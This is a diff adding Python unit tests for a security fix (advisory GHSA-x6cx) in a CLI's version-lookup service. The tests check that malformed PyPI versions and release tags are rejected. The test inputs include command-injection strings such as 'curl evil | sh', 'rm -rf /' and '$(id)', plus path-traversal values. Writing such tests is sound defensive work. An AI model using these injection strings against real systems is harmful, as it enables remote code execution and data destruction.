@@ -52,6 +52,17 @@ class TestFetchMcpLatestVersion:
         assert _fetch_mcp_latest_version() == "1.46.0"
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
+    def test_rejects_malformed_pypi_version(self, mock_get: MagicMock) -> None:
+        """GHSA-x6cx: a malformed PyPI version must be rejected, not accepted on
+        a valid prefix (defense-in-depth on the MCP upgrade-command path)."""
+        mock_response = MagicMock()
+        mock_response.raise_for_status = MagicMock()
+        mock_get.return_value = mock_response
+        for bad in ("1.46.0; evil", "1.46.0/../x", "garbage"):
+            mock_response.json.return_value = {"info": {"version": bad}}
+            assert _fetch_mcp_latest_version() is None, bad
+
+    @patch("keboola_agent_cli.services.version_service.httpx.get")
     def test_http_error(self, mock_get: MagicMock) -> None:
         import httpx
 
@@ -835,6 +846,38 @@ class TestFetchKbagentLatestVersion:
         assert mock_get.call_count == 1
         url = mock_get.call_args.args[0]
         assert url.endswith("/releases/latest")
+
+    @patch("keboola_agent_cli.services.version_service.httpx.get")
+    def test_rejects_adversarial_release_tag(self, mock_get: MagicMock) -> None:
+        """GHSA-x6cx: a tag whose valid version prefix is followed by garbage
+        must be rejected. The old non-end-anchored ``re.match`` accepted it on
+        the prefix, letting it flow into the upgrade command."""
+        mock_response = MagicMock()
+        mock_response.raise_for_status = MagicMock()
+        mock_get.return_value = mock_response
+        for bad in (
+            "v0.99.0; curl evil | sh",
+            "v0.99.0 && rm -rf /",
+            "v0.99.0/../../x",
+            "v0.99.0$(id)",
+            "v0.99.0evil",
+            "vgarbage",
+        ):
+            mock_response.json.return_value = {"tag_name": bad}
+            assert _fetch_kbagent_latest_version() is None, bad
+
+    @patch("keboola_agent_cli.services.version_service.httpx.get")
+    def test_accepts_valid_stable_and_beta_tags(self, mock_get: MagicMock) -> None:
+        mock_response = MagicMock()
+        mock_response.raise_for_status = MagicMock()
+        mock_get.return_value = mock_response
+        for tag, expected in (
+            ("v0.65.1", "0.65.1"),
+            ("v0.43.0b1", "0.43.0b1"),
+            ("0.65.2", "0.65.2"),
+        ):
+            mock_response.json.return_value = {"tag_name": tag}
+            assert _fetch_kbagent_latest_version() == expected, tag
 
     @patch("keboola_agent_cli.services.version_service.httpx.get")
     def test_prerelease_returns_highest_pep440_version(self, mock_get: MagicMock) -> None:
